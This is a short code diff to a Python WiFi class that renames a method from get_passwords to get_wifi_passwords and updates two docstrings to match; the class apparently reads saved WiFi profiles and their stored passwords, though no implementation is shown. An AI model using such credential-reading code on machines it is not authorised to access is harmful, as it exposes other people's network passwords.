@@ -27,7 +27,7 @@ class WiFi:
     @catch
     @staticmethod
     def get_wifi_profiles() -> list[str]:
-        """Retrieves all wifi profiles from the system -- Not implemented into get_passwords yet
+        """Retrieves all wifi profiles from the system -- Not implemented into get_wifi_passwords yet
 
         Parameters:
             None
@@ -49,7 +49,7 @@ class WiFi:
     @catch
     @staticmethod
     def get_profile_info(profile: str) -> list[str]:
-        """Retrieves wifi profile information for a given profile name -- Not implemented into get_passwords yet
+        """Retrieves wifi profile information for a given profile name -- Not implemented into get_wifi_passwords yet
 
         Parameters:
             profile (str): The name of the wifi profile
@@ -69,7 +69,7 @@ class WiFi:
         return info
 
     @catch
-    def get_passwords(self):
+    def get_wifi_passwords(self):
         """Gets all wifi profiles and their passwords from the system
 
         Parameters:
